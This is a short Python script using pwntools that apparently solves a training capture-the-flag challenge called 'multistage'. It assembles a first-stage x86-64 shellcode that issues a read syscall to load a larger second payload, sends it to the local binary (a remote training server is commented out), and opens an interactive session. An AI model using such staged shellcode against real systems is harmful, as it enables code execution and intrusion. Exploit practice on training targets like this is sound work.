from pwn import *

asm_code = """
mov rsi,rax
xor rax,rax
xor rdi,rdi
mov dl,0xff
syscall
"""

context.arch = 'amd64'


shellcode = asm(asm_code)

p = process("./multistage")
#p = remote("bin.training.jinblack.it", 3001)
p.send(shellcode)

p.interactive()
